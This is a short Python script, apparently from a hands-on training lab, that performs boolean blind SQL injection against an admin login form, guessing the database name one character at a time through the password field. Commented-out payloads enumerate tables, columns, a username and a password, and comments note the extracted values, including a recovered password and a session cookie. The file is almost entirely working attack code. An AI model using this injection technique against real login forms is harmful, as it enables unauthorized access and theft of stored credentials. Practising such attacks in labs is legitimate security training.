#!/usr/bin/env python3
# xeniel was here

import requests

charset = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$^&*()-_=+{}'
result = ""

url = "https://xh180kj2m9w56z46rg8y9hlqn.us-east-1.attackdefensecloudlabs.com:443/admin/staff.php"
cookies = {"PHPSESSID": "3dhbd27qkdem53rgc9lbulr707"}
headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "Accept-Language": "es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3", "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded", "Origin": "https://np9h3lsclq999zl2raf9tnuj1.us-east-1.attackdefensecloudlabs.com", "DNT": "1", "Connection": "close", "Referer": "https://np9h3lsclq999zl2raf9tnuj1.us-east-1.attackdefensecloudlabs.com/admin/", "Upgrade-Insecure-Requests": "1", "Sec-GPC": "1"}

for i in range(1,30):
    for ch in charset:

        # "1'or substr((SELECT table_name FROM information_schema.tables where table_schema = database() limit 2,1),{},1) like binary '{}".format(i,ch)
        # comentarios articulos tickets departamentos guias staff 
        # "1'or substr((SELECT column_name FROM information_schema.columns where table_schema = database() and table_name= 'staff' limit 2,1),{},1) like binary '{}".format(i,ch)
        # name user pass email articulo ban ultima
        # "1'or substr(user,{},1) like binary '{}".format(i,ch)
        # staff1 
        # "1'or substr(pass,{},1) like binary '{}".format(i,ch)
        # cuUTpxnt

        payload = "1'or substr(database(),{},1) like binary '{}".format(i,ch)
        data = {"user": "a", "pass": payload, "Submit22": " Login "}
        r = requests.post(url, headers=headers, cookies=cookies, data=data)

        if "ERROR, CAN NOT LOGIN" not in r.text:
            result += ch
            print(result)
            break

print("DATABASE: " + result)       